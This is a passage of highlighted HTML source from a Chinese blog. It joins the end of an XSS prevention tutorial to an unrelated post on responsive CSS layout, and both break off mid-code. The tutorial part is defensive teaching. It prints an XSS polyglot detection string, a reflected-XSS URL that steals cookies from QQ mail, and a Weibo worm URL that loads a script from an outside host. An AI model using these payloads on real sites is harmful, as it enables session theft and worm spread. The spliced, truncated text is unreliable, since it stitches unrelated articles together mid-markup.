<span class="kd">var</span> <span class="nx">__INITIAL_STATE__</span> <span class="o">=</span> <span class="nx">JSON</span><span class="p">.</span><span class="nx">parse</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;%= Encoder.forJavaScript(data.to_json) %&gt;</span><span class="dl">'</span><span class="p">);</span>
<span class="nt">&lt;/script&gt;</span>

<span class="c">&lt;!-- HTML 标签内联监听器 --&gt;</span>
<span class="nt">&lt;button</span>
  <span class="na">onclick=</span><span class="s">"alert('&lt;%= Encode.forJavaScript(UNTRUSTED) %&gt;');"</span><span class="nt">&gt;</span>
  click me
<span class="nt">&lt;/button&gt;</span>

<span class="c">&lt;!-- URL 参数 --&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/search?value=&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;&amp;order=1#top"</span><span class="nt">&gt;</span>

<span class="c">&lt;!-- URL 路径 --&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"/page/&lt;%= Encode.forUriComponent(UNTRUSTED) %&gt;"</span><span class="nt">&gt;</span>

<span class="c">&lt;!--
  URL.
  注意：要根据项目情况进行过滤，禁止掉 "javascript:" 链接、非法 scheme 等
--&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">'&lt;%=
  urlValidator.isValid(UNTRUSTED) ?
    Encode.forHtml(UNTRUSTED) :
    "/404"
%&gt;'</span><span class="nt">&gt;</span>
  link
<span class="nt">&lt;/a&gt;</span>
</code></pre></div></div>

<p>可见，HTML 的编码是十分复杂的，在不同的上下文里要使用相应的转义规则。</p>

<h3 id="预防-dom-型-xss-攻击">预防 DOM 型 XSS 攻击</h3>

<p>DOM 型 XSS 攻击，实际上就是网站前端 JavaScript 代码本身不够严谨，把不可信的数据当作代码执行了。</p>

<p>在使用 <code class="language-plaintext highlighter-rouge">.innerHTML</code>、<code class="language-plaintext highlighter-rouge">.outerHTML</code>、<code class="language-plaintext highlighter-rouge">document.write()</code> 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 <code class="language-plaintext highlighter-rouge">.textContent</code>、<code class="language-plaintext highlighter-rouge">.setAttribute()</code> 等。</p>

<p>如果用 Vue/React 技术栈，并且不使用 <code class="language-plaintext highlighter-rouge">v-html</code>/<code class="language-plaintext highlighter-rouge">dangerouslySetInnerHTML</code> 功能，就在前端 render 阶段避免 <code class="language-plaintext highlighter-rouge">innerHTML</code>、<code class="language-plaintext highlighter-rouge">outerHTML</code> 的 XSS 隐患。</p>

<p>DOM 中的内联事件监听器，如 <code class="language-plaintext highlighter-rouge">location</code>、<code class="language-plaintext highlighter-rouge">onclick</code>、<code class="language-plaintext highlighter-rouge">onerror</code>、<code class="language-plaintext highlighter-rouge">onload</code>、<code class="language-plaintext highlighter-rouge">onmouseover</code> 等，<code class="language-plaintext highlighter-rouge">&lt;a&gt;</code> 标签的 <code class="language-plaintext highlighter-rouge">href</code> 属性，JavaScript 的 <code class="language-plaintext highlighter-rouge">eval()</code>、<code class="language-plaintext highlighter-rouge">setTimeout()</code>、<code class="language-plaintext highlighter-rouge">setInterval()</code> 等，都能把字符串作为代码运行。如果不可信的数据拼接到字符串中传递给这些 API，很容易产生安全隐患，请务必避免。</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!-- 内联事件监听器中包含恶意代码 --&gt;</span>
![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/3e724ce0.data:image/png,)

<span class="c">&lt;!-- 链接内包含恶意代码 --&gt;</span>
<span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"UNTRUSTED"</span><span class="nt">&gt;</span>1<span class="nt">&lt;/a&gt;</span>

<span class="nt">&lt;script&gt;</span>
<span class="c1">// setTimeout()/setInterval() 中调用恶意代码</span>
<span class="nx">setTimeout</span><span class="p">(</span><span class="dl">"</span><span class="s2">UNTRUSTED</span><span class="dl">"</span><span class="p">)</span>
<span class="nx">setInterval</span><span class="p">(</span><span class="dl">"</span><span class="s2">UNTRUSTED</span><span class="dl">"</span><span class="p">)</span>

<span class="c1">// location 调用恶意代码</span>
<span class="nx">location</span><span class="p">.</span><span class="nx">href</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">UNTRUSTED</span><span class="dl">'</span>

<span class="c1">// eval() 中调用恶意代码</span>
<span class="nb">eval</span><span class="p">(</span><span class="dl">"</span><span class="s2">UNTRUSTED</span><span class="dl">"</span><span class="p">)</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>如果项目中有用到这些的话，一定要避免在字符串中拼接不可信数据。</p>

<h2 id="其他-xss-防范措施">其他 XSS 防范措施</h2>

<p>虽然在渲染页面和执行 JavaScript 时，通过谨慎的转义可以防止 XSS 的发生，但完全依靠开发的谨慎仍然是不够的。以下介绍一些通用的方案，可以降低 XSS 带来的风险和后果。</p>

<h3 id="content-security-policy">Content Security Policy</h3>

<p>严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>

<ul>
  <li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
  <li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
  <li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li>
  <li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li>
  <li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
</ul>

<p>关于 CSP 的详情，请关注前端安全系列后续的文章。</p>

<h3 id="输入内容长度控制">输入内容长度控制</h3>

<p>对于不受信任的输入，都应该限定一个合理的长度。虽然无法完全防止 XSS 发生，但可以增加 XSS 攻击的难度。</p>

<h3 id="其他安全措施">其他安全措施</h3>

<ul>
  <li>HTTP-only Cookie: 禁止 JavaScript 读取某些敏感 Cookie，攻击者完成 XSS 注入后也无法窃取此 Cookie。</li>
  <li>验证码：防止脚本冒充用户提交危险操作。</li>
</ul>

<h2 id="xss-的检测">XSS 的检测</h2>

<p>上述经历让小明收获颇丰，他也学会了如何去预防和修复 XSS 漏洞，在日常开发中也具备了相关的安全意识。但对于已经上线的代码，如何去检测其中有没有 XSS 漏洞呢？</p>

<p>经过一番搜索，小明找到了两个方法：</p>

<ol>
  <li>使用通用 XSS 攻击字符串手动检测 XSS 漏洞。</li>
  <li>使用扫描工具自动检测 XSS 漏洞。</li>
</ol>

<p>在<a href="https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot">Unleashing an Ultimate XSS Polyglot</a>一文中，小明发现了这么一个字符串：</p>

<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">jaVasCript</span><span class="p">:</span><span class="cm">/*-/*`/*\`/*'/*"/**/</span><span class="p">(</span><span class="cm">/* */</span><span class="nx">oNcliCk</span><span class="o">=</span><span class="nx">alert</span><span class="p">()</span> <span class="p">)</span><span class="c1">//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=alert()//&gt;\x3e</span>
</code></pre></div></div>

<p>它能够检测到存在于 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等多种上下文中的 XSS 漏洞，也能检测 <code class="language-plaintext highlighter-rouge">eval()</code>、<code class="language-plaintext highlighter-rouge">setTimeout()</code>、<code class="language-plaintext highlighter-rouge">setInterval()</code>、<code class="language-plaintext highlighter-rouge">Function()</code>、<code class="language-plaintext highlighter-rouge">innerHTML</code>、<code class="language-plaintext highlighter-rouge">document.write()</code> 等 DOM 型 XSS 漏洞，并且能绕过一些 XSS 过滤器。</p>

<p>小明只要在网站的各输入框中提交这个字符串，或者把它拼接到 URL 参数上，就可以进行检测了。</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://xxx/search?keyword=jaVasCript%3A%2F*-%2F*%60%2F*%60%2F*%27%2F*%22%2F**%2F(%2F*%20*%2FoNcliCk%3Dalert()%20)%2F%2F%250D%250A%250d%250a%2F%2F%3C%2FstYle%2F%3C%2FtitLe%2F%3C%2FteXtarEa%2F%3C%2FscRipt%2F--!%3E%3CsVg%2F%3CsVg%2FoNloAd%3Dalert()%2F%2F%3E%3E
</code></pre></div></div>

<p>除了手动检测之外，还可以使用自动扫描工具寻找 XSS 漏洞，例如 <a href="https://github.com/Arachni/arachni">Arachni</a>、<a href="https://github.com/mozilla/http-observatory/">Mozilla HTTP Observatory</a>、<a href="https://github.com/andresriancho/w3af">w3af</a> 等。</p>

<h2 id="xss-攻击案例">XSS 攻击案例</h2>

<h4 id="qq-邮箱-mexmailqqcom-域名反射型-xss-漏洞">QQ 邮箱 m.exmail.qq.com 域名反射型 XSS 漏洞</h4>

<p>攻击者发现 <code class="language-plaintext highlighter-rouge">http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb</code> 这个 URL 的参数 <code class="language-plaintext highlighter-rouge">uin</code>、<code class="language-plaintext highlighter-rouge">domain</code> 未经转义直接输出到 HTML 中。</p>

<p>于是攻击者构建出一个 URL，并引导用户去点击： <code class="language-plaintext highlighter-rouge">http://m.exmail.qq.com/cgi-bin/login?uin=aaaa&amp;domain=bbbb%26quot%3B%3Breturn+false%3B%26quot%3B%26lt%3B%2Fscript%26gt%3B%26lt%3Bscript%26gt%3Balert(document.cookie)%26lt%3B%2Fscript%26gt%3B</code></p>

<p>用户点击这个 URL 时，服务端取出 URL 参数，拼接到 HTML 响应中：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script&gt;</span>
<span class="nx">getTop</span><span class="p">().</span><span class="nx">location</span><span class="p">.</span><span class="nx">href</span><span class="o">=</span><span class="dl">"</span><span class="s2">/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=aaa</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;t=</span><span class="dl">"</span><span class="o">+</span><span class="dl">"</span><span class="s2">&amp;d=bbbb</span><span class="dl">"</span><span class="p">;</span><span class="k">return</span> <span class="kc">false</span><span class="p">;</span><span class="nt">&lt;/script&gt;&lt;script&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="nt">&lt;/script&gt;</span>"+"...
</code></pre></div></div>

<p>浏览器接收到响应后就会执行 <code class="language-plaintext highlighter-rouge">alert(document.cookie)</code>，攻击者通过 JavaScript 即可窃取当前用户在 QQ 邮箱域名下的 Cookie ，进而危害数据安全。</p>

<h4 id="新浪微博名人堂反射型-xss-漏洞">新浪微博名人堂反射型 XSS 漏洞</h4>

<p>攻击者发现 <code class="language-plaintext highlighter-rouge">http://weibo.com/pub/star/g/xyyyd</code> 这个 URL 的内容未经过滤直接输出到 HTML 中。</p>

<p>于是攻击者构建出一个 URL，然后诱导用户去点击：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://weibo.com/pub/star/g/xyyyd"&gt;&lt;script src=//xxxx.cn/image/t.js&gt;&lt;/script&gt;
</code></pre></div></div>

<p>用户点击这个 URL 时，服务端取出请求 URL，拼接到 HTML 响应中：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;li&gt;&lt;a</span> <span class="na">href=</span><span class="s">"http://weibo.com/pub/star/g/xyyyd"</span><span class="nt">&gt;&lt;script </span><span class="na">src=</span><span class="s">//xxxx.cn/image/t.js</span><span class="nt">&gt;&lt;/script&gt;</span>"&gt;按分类检索<span class="nt">&lt;/a&gt;&lt;/li&gt;</span>
</code></pre></div></div>

<p>浏览器接收到响应后就会加载执行恶意脚本 <code class="language-plaintext highlighter-rouge">//xxxx.cn/image/t.js</code>，在恶意脚本中利用用户的登录状态进行关注、发微博、发私信等操作，发出的微博和私信可再带上攻击 URL，诱导更多人点击，不断放大攻击范围。这种窃用受害者身份发布恶意内容，层层放大攻击范围的方式，被称为“XSS 蠕虫”。</p>

<h2 id="扩展阅读automatic-context-aware-escaping">扩展阅读：Automatic Context-Aware Escaping</h2>

<p>上文我们说到：</p>

<ol>
  <li>合适的 HTML 转义可以有效避免 XSS 漏洞。</li>
  <li>完善的转义库需要针对上下文制定多种规则，例如 HTML 属性、HTML 文字内容、HTML 注释、跳转链接、内联 JavaScript 字符串、内联 CSS 样式表等等。</li>
  <li>业务 RD 需要根据每个插入点所处的上下文，选取不同的转义规则。</li>
</ol>

<p>通常，转义库是不能判断插入点上下文的（Not Context-Aware），实施转义规则的责任就落到了业务 RD 身上，需要每个业务 RD 都充分理解 XSS 的各种情况，并且需要保证每一个插入点使用了正确的转义规则。</p>

<p>这种机制工作量大，全靠人工保证，很容易造成 XSS 漏洞，安全人员也很难发现隐患。</p>

<p>2009年，Google 提出了一个概念叫做：<a href="https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html">Automatic Context-Aware Escaping</a>。</p>

<p>所谓 Context-Aware，就是说模板引擎在解析模板字符串的时候，就解析模板语法，分析出每个插入点所处的上下文，据此自动选用不同的转义规则。这样就减轻了业务 RD 的工作负担，也减少了人为带来的疏漏。</p>

<p>在一个支持 Automatic Context-Aware Escaping 的模板引擎里，业务 RD 可以这样定义模板，而无需手动实施转义规则：</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;html&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"UTF-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;title&gt;&lt;/title&gt;</span>
  <span class="nt">&lt;/head&gt;</span>
  <span class="nt">&lt;body&gt;</span>
    <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">""</span><span class="nt">&gt;</span><span class="c">&lt;!-- Image to hack wechat --&gt;</span>
<span class="c">&lt;!-- &lt;img src="/img/icon_wechat.png" width="0" height="0"&gt; --&gt;</span>
<span class="c">&lt;!-- &lt;img src="/https://cdn.jsdelivr.net/gh/tian-guo-guo/cdn@1.0/assets/img/home-bg-art.jpg" width="0" height="0"&gt; --&gt;</span>

<span class="c">&lt;!-- Post Header --&gt;</span>
<span class="nt">&lt;style </span><span class="na">type=</span><span class="s">"text/css"</span><span class="nt">&gt;</span>
    <span class="nt">header</span><span class="nc">.intro-header</span><span class="p">{</span>
        <span class="nl">position</span><span class="p">:</span> <span class="nb">relative</span><span class="p">;</span>
        <span class="nl">background-image</span><span class="p">:</span> <span class="sx">url('https://cdn.jsdelivr.net/gh/tian-guo-guo/cdn@1.0/assets/img/home-bg-art.jpg')</span>
    <span class="p">}</span>

    
<span class="nt">&lt;/style&gt;</span>
<span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"intro-header"</span> <span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"header-mask"</span><span class="nt">&gt;&lt;/div&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"</span><span class="nt">&gt;</span>
                <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"post-heading"</span><span class="nt">&gt;</span>
                    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"tags"</span><span class="nt">&gt;</span>
                        
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"tag"</span> <span class="na">href=</span><span class="s">"/tags/#前端"</span> <span class="na">title=</span><span class="s">"前端"</span><span class="nt">&gt;</span>前端<span class="nt">&lt;/a&gt;</span>
                        
                        <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"tag"</span> <span class="na">href=</span><span class="s">"/tags/#面试"</span> <span class="na">title=</span><span class="s">"面试"</span><span class="nt">&gt;</span>面试<span class="nt">&lt;/a&gt;</span>
                        
                    <span class="nt">&lt;/div&gt;</span>
                    <span class="nt">&lt;h1&gt;</span>前端响应式布局原理与方案（详细版）<span class="nt">&lt;/h1&gt;</span>
                    
                    
                    <span class="nt">&lt;h2</span> <span class="na">class=</span><span class="s">"subheading"</span><span class="nt">&gt;</span>前端响应式布局原理与方案（详细版）<span class="nt">&lt;/h2&gt;</span>
                    
                    <span class="nt">&lt;span</span> <span class="na">class=</span><span class="s">"meta"</span><span class="nt">&gt;</span>Posted by 甜果果 on October 11, 2020<span class="nt">&lt;/span&gt;</span>
                <span class="nt">&lt;/div&gt;</span>
            <span class="nt">&lt;/div&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/header&gt;</span>

<span class="c">&lt;!-- Post Content --&gt;</span>
<span class="nt">&lt;article&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>

    <span class="c">&lt;!-- Post Container --&gt;</span>
            <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"
                col-lg-8 col-lg-offset-2
                col-md-10 col-md-offset-1
                post-container"</span><span class="nt">&gt;</span>

				<span class="nt">&lt;h1</span> <span class="na">id=</span><span class="s">"前端响应式布局原理与方案详细版"</span><span class="nt">&gt;</span>前端响应式布局原理与方案（详细版）<span class="nt">&lt;/h1&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"引言"</span><span class="nt">&gt;</span>引言<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;p&gt;</span>响应式布局指的是同一页面在不同屏幕尺寸下有不同的布局。传统的开发方式是PC端开发一套，手机端再开发一套，而使用响应式布局只要开发一套就够，缺点就是<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS<span class="nt">&lt;/code&gt;</span>比较重。下面是博客网站对不同设备适配后的结果，分别是<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>iPhone5/SE<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>iphone6/7/8<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>iphone 6/7/8 plus<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>ipad pro<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>dell台式宽屏(1440 X 900)<span class="nt">&lt;/code&gt;</span>。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;blockquote&gt;</span>
  <span class="nt">&lt;p&gt;</span>响应式设计与自适应设计的区别：响应式开发一套界面，通过检测视口分辨率，针对不同客户端在客户端做代码处理，来展现不同的布局和内容；自适应需要开发多套界面，通过检测视口分辨率，来判断当前访问的设备是pc端、平板、手机，从而请求服务层，返回不同的页面。<span class="nt">&lt;/p&gt;</span>
<span class="nt">&lt;/blockquote&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa90c7235d85f?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa90e7c6d1332?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa91116cdded6?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;h2</span> <span class="na">id=</span><span class="s">"响应式布局的实现方案"</span><span class="nt">&gt;</span>响应式布局的实现方案<span class="nt">&lt;/h2&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"1-媒体查询"</span><span class="nt">&gt;</span>1. 媒体查询<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS3<span class="nt">&lt;/code&gt;</span>媒体查询可以让我们针对不同的媒体类型定义不同的样式，当重置浏览器窗口大小的过程中，页面也会根据浏览器的宽度和高度重新渲染页面。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h4</span> <span class="na">id=</span><span class="s">"如何选择屏幕大小分割点"</span><span class="nt">&gt;</span>如何选择屏幕大小分割点<span class="nt">&lt;/h4&gt;</span>

<span class="nt">&lt;p&gt;</span>如何确定媒体查询的分割点也是一个开发中会遇到的问题，下面是市场上的移动设备和电脑屏幕分辨率的分布情况，可以发现不同品牌和型号的设备屏幕分辨率一般都不一样<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa8fe7ac87fa5?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>如果我们选择<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>600px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>900px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>1200px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>1800px<span class="nt">&lt;/code&gt;</span>作为分割点，可以适配到常见的14个机型：<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa907bb99b4ea?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>当然这只是其中的一种分割方案，我们还可以这样划分：<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>480px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>800px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>1400px<span class="nt">&lt;/code&gt;</span>,<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>1400px<span class="nt">&lt;/code&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2017/11/24/15fec33003371f62?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>而作为曾经典型的响应式布局框架，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>Bootstrap<span class="nt">&lt;/code&gt;</span>是怎么进行断点的呢？<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;img</span> <span class="na">src=</span><span class="s">"https://user-gold-cdn.xitu.io/2019/4/8/169fa8fc4e71232e?imageView2/0/w/1280/h/960/format/webp/ignore-error/1"</span> <span class="na">alt=</span><span class="s">"img"</span> <span class="nt">/&gt;&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;</span>上面的分割方案不一定满足项目中的实际需求，我们可以先用跨度大的分割点进行分割，如果出现不适配的情况可以再根据实际情况增加新的分割点。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;h4</span> <span class="na">id=</span><span class="s">"移动优先-or--pc优先"</span><span class="nt">&gt;</span>移动优先 OR  PC优先<span class="nt">&lt;/h4&gt;</span>

<span class="nt">&lt;p&gt;</span>不管是移动优先还是PC优先，都是依据当随着屏幕宽度增大或减小的时候，后面的样式会覆盖前面的样式。因此，移动端优先首先使用的是<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>min-width<span class="nt">&lt;/code&gt;</span>，PC端优先使用的<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>max-width<span class="nt">&lt;/code&gt;</span>。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>移动优先:<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/* iphone6 7 8 */
body {
    background-color: yellow;
}
/* iphone 5 */
@media screen and (max-width: 320px) {
    body {
      background-color: red;
    }
}
/* iphoneX */
@media screen and (min-width: 375px) and (-webkit-device-pixel-ratio: 3) {
    body {
      background-color: #0FF000;
    }
}
/* iphone6 7 8 plus */
@media screen and (min-width: 414px) {
    body {
      background-color: blue;
    }
}
/* ipad */
@media screen and (min-width: 768px) {
    body {
      background-color: green;
    }
}
/* ipad pro */
@media screen and (min-width: 1024px) {
    body {
      background-color: #FF00FF;
    }
}
/* pc */
@media screen and (min-width: 1100px) {
    body {
      background-color: black;
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;p&gt;&lt;strong&gt;</span>PC优先：<span class="nt">&lt;/strong&gt;&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/* pc width <span class="ni">&amp;gt;</span> 1024px */
    body {
        background-color: yellow;
    }
/* ipad pro */
@media screen and (max-width: 1024px) {
    body {
        background-color: #FF00FF;
    }
}
/* ipad */
@media screen and (max-width: 768px) {
    body {
        background-color: green;
    }
}
/* iphone6 7 8 plus */
@media screen and (max-width: 414px) {
    body {
        background-color: blue;
    }
}
/* iphoneX */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 3) {
    body {
        background-color: #0FF000;
    }
}
/* iphone6 7 8 */
@media screen and (max-width: 375px) and (-webkit-device-pixel-ratio: 2) {
    body {
        background-color: #0FF000;
    }
}
/* iphone5 */
@media screen and (max-width: 320px) {
    body {
        background-color: #0FF000;
    }
}
复制代码
<span class="nt">&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</span>

<span class="nt">&lt;h3</span> <span class="na">id=</span><span class="s">"2百分比布局"</span><span class="nt">&gt;</span>2.百分比布局<span class="nt">&lt;/h3&gt;</span>

<span class="nt">&lt;p&gt;</span>通过百分比单位，可以使得浏览器中组件的宽和高随着浏览器的高度的变化而变化，从而实现响应式的效果。Bootstrap里面的栅格系统就是利用百分比来定义元素的宽高，<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>CSS3<span class="nt">&lt;/code&gt;</span>支持最大最小高，可以将百分比和<span class="nt">&lt;code</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;</span>max(min)<span class="nt">&lt;/code&gt;</span>一起结合使用来定义元素在不同设备下的宽高。<span class="nt">&lt;/p&gt;</span>

<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"language-plaintext highlighter-rouge"</span><span class="nt">&gt;&lt;div</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;pre</span> <span class="na">class=</span><span class="s">"highlight"</span><span class="nt">&gt;&lt;code&gt;</span>/* pc width <span class="ni">&amp;gt;</span> 1100px */
html, body { margin: 0;padding: 0;width: 100%;height: 100%;}
aside {
    width: 10%;
    height: 100%;
    background-color: red;
    float: left;
}
main {
    height: 100%;
    background-color: blue;
    overflow: hidden;
}
/* ipad pro */
@media screen and (max-width: 1024px) {
    aside {
      width: 8%;
